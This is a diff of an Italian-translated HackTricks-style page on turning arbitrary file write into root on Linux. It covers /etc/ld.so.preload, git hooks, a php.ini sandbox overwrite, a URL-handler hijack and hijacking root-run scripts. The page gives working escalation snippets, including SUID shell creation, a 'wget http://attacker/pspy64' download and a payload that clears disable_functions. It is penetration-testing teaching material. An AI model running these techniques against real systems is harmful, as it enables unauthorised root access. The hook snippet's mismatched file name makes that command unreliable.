@@ -1,13 +1,13 @@
-# Scrittura arbitraria di file come root
+# Arbitrary File Write to Root
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`**, ma funziona anche in **SUID binaries**.\
+Questo file si comporta come la variabile di ambiente **`LD_PRELOAD`**, ma funziona anche nei **SUID binaries**.\
 Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **percorso a una libreria che verrà caricata** con ogni binario eseguito.
 
-Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
+Per esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -24,28 +24,44 @@ system("/bin/bash");
 ```
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git, come quando viene creato un commit, un merge... Quindi se uno **script o utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, questo può essere sfruttato per ottenere **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git come quando viene creato un commit, un merge... Quindi se uno **script o utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, ciò può essere usato per il **privesc**.
 
-Ad esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** così che venga sempre eseguito quando viene creato un nuovo commit:
+Per esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** in modo che venga sempre eseguito quando viene creato un nuovo commit:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-### Cron e file temporali
+### Cron & Time files
 
 TODO
 
-### File di servizio e socket
+### Service & Socket files
 
 TODO
+
+### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox
+
+Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (per esempio, `disable_functions=exec,system,...`). Se il codice sandboxato ha ancora **qualsiasi primitive di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto del `php.ini`** usato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e poi inviare un secondo payload che verrà eseguito con privilegi elevati.
+
+Flusso tipico:
+
+1. Il primo payload sovrascrive la configurazione della sandbox.
+2. Il secondo payload esegue codice ora che le funzioni pericolose sono riabilitate.
+
+Minimal example (replace the path used by the daemon):
+```php
+<?php
+file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
+```
+Se il daemon è in esecuzione come root (o effettua validazioni con percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Questo è essenzialmente **privilege escalation via config overwrite** quando il sandboxed runtime può ancora scrivere file.
 
 ### binfmt_misc
 
-Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quale tipo di file. TODO: verificare i requisiti per abusare di questo per eseguire una rev shell quando un tipo di file comune è aperto.
+Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quale tipo di file. TODO: verificare i requisiti per sfruttare questo meccanismo per eseguire una rev shell quando un tipo di file comune è aperto.
 
-### Overwrite schema handlers (like http: or https:)
+### Sovrascrivere i gestori di schema (come http: o https:)
 
-Un attaccante con permessi di scrittura sulle directory di configurazione della vittima può facilmente sostituire o creare file che cambiano il comportamento del sistema, causando esecuzione di codice non voluta. Modificando il file `$HOME/.config/mimeapps.list` per puntare i gestori URL HTTP e HTTPS a un file malevolo (es., impostando `x-scheme-handler/http=evil.desktop`), l'attaccante si assicura che **cliccando qualsiasi link http o https venga eseguito il codice specificato in quel file `evil.desktop`**. Ad esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` in `$HOME/.local/share/applications`, qualsiasi clic su un URL esterno esegue il comando incorporato:
+Un attacker con permessi di scrittura sulle directory di configurazione della vittima può facilmente sostituire o creare file che modificano il comportamento di sistema, portando a esecuzione di codice non intenzionata. Modificando il file `$HOME/.config/mimeapps.list` per puntare i gestori di URL HTTP e HTTPS a un file malevolo (ad es., impostando `x-scheme-handler/http=evil.desktop`), l'attacker garantisce che **cliccare qualsiasi link http o https avvii il codice specificato in quel file `evil.desktop`**. Ad esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` in `$HOME/.local/share/applications`, qualsiasi clic su un URL esterno esegue il comando incorporato:
 ```bash
 [Desktop Entry]
 Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
@@ -56,16 +72,16 @@ Per maggiori informazioni controlla [**this post**](https://chatgpt.com/c/67fac0
 
 ### Root che esegue script/binari scrivibili dall'utente
 
-Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binario all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:
+Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binary all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:
 
-- **Rilevare l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per catturare root che invoca percorsi controllati dall'utente:
+- **Rileva l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per intercettare root che invoca percorsi controllati dall'utente:
 ```bash
 wget http://attacker/pspy64 -O /dev/shm/pspy64
 chmod +x /dev/shm/pspy64
 /dev/shm/pspy64   # wait for root commands pointing to your writable path
 ```
-- **Conferma la scrivibilità:** assicurati che sia il file di destinazione che la relativa directory siano di proprietà e scrivibili dal tuo utente.
-- **Hijack the target:** esegui il backup del binary/script originale e inserisci un payload che crea una SUID shell (o qualsiasi altra azione root), poi ripristina i permessi:
+- **Confirm writeability:** assicurati che sia il file target che la sua directory siano di proprietà e scrivibili dal tuo utente.
+- **Hijack the target:** esegui il backup del binary/script originale e deposita un payload che crea una SUID shell (o qualunque altra azione root), poi ripristina i permessi:
 ```bash
 mv server-command server-command.bk
 cat > server-command <<'EOF'
@@ -76,10 +92,11 @@ chmod 6777 /tmp/rootshell
 EOF
 chmod +x server-command
 ```
-- **Attiva l'azione privilegiata** (ad es., premendo un pulsante UI che spawns the helper). Quando root riesegue il hijacked path, prendi l'escalated shell con `./rootshell -p`.
+- **Innescare l'azione privilegiata** (es., premendo un pulsante UI che avvia lo helper). Quando root riesegue il hijacked path, prendi la shell escalata con `./rootshell -p`.
 
 ## Riferimenti
 
 - [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
 
 {{#include ../../banners/hacktricks-training.md}}
